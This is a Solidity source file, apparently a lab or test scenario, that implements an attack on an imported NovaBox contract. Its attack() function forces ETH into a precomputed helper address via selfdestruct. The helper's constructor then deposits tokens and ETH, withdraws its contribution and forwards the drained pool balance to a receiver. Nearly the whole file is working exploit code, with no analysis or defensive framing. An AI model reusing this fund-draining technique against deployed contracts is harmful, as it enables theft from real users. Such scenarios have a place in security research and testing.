pragma solidity 0.4.25;

import "./NovaBox.sol";

interface INova {
    function transfer(address,uint) external returns (bool);
    function transferFrom(address,address,uint) external returns (bool);
    function approve(address,uint) external returns (bool);
    function balanceOf(address) external view returns (uint);
    function mint(address,uint) external;
}
interface IBox {
    function depositTokens(address,uint) external;
    function withdrawEth(uint) external;
    function contributionsEth(address) external view returns (uint);
}
interface IScenario { function fund(address) external; }
interface IEscrow { function release() external; }

contract TokenMock {
    mapping(address=>uint) public balanceOf;
    mapping(address=>mapping(address=>uint)) public allowance;
    function mint(address a,uint n) external { balanceOf[a] += n; }
    function approve(address s,uint n) external returns(bool) { allowance[msg.sender][s] = n; return true; }
    function transfer(address t,uint n) external returns(bool) { require(balanceOf[msg.sender] >= n); balanceOf[msg.sender]-=n; balanceOf[t]+=n; return true; }
    function transferFrom(address f,address t,uint n) external returns(bool) { require(balanceOf[f]>=n && allowance[f][msg.sender]>=n); allowance[f][msg.sender]-=n; balanceOf[f]-=n; balanceOf[t]+=n; return true; }
}

contract ForceSender {
    function() external payable {}
    function deposit() external payable {}
    function release() external { selfdestruct(msg.sender); }
}

contract SeedHelper {
    address constant NOVA = 0x72FBc0fc1446f5AcCC1B083F0852a7ef70a8ec9f;
    constructor(address b,address source) public payable {
        IScenario(source).fund(address(this));
        uint n = INova(NOVA).balanceOf(address(this));
        INova(NOVA).approve(b,n);
        IBox(b).depositTokens(address(this),0);
        (bool ok,) = address(b).call.value(msg.value)(new bytes(0));
        require(ok);
    }
}

contract NovaHelper {
    address constant NOVA = 0x72FBc0fc1446f5AcCC1B083F0852a7ef70a8ec9f;
    IBox public box;
    constructor(address b,address source,address escrow) public {
        box = IBox(b);
        IEscrow(escrow).release();
        IScenario(source).fund(address(this));
        uint n = INova(NOVA).balanceOf(address(this));
        require(n > 0);
        INova(NOVA).approve(b,n);
        box.depositTokens(address(this),0);
        (bool ok,) = address(box).call.value(address(this).balance)(new bytes(0));
        require(ok);
        uint c = box.contributionsEth(address(this));
        box.withdrawEth(c);
        msg.sender.transfer(address(this).balance);
    }
}

contract Scenario {
    address public box;
    address public escrow;
    address constant NOVA = 0x72FBc0fc1446f5AcCC1B083F0852a7ef70a8ec9f;
    constructor() public { box = address(new NovaBox()); escrow = address(new ForceSender()); }
    function fund(address recipient) external {
        require(msg.sender == recipient);
        uint n = INova(NOVA).balanceOf(address(this));
        require(n > 0);
        INova(NOVA).transfer(recipient,n);
    }
    function seed() external payable {
        INova(NOVA).approve(box,100 ether);
        IBox(box).depositTokens(address(this),0);
        address(box).call.value(msg.value)(new bytes(0));
    }
    function attack(address receiver) external payable {
        require(msg.value > 0);
        ForceSender(escrow).deposit.value(msg.value)();
        new NovaHelper(box,address(this),escrow);
        receiver.transfer(address(this).balance);
    }
    function() external payable {}
    function pool() external view returns(uint) { return address(box).balance; }
}

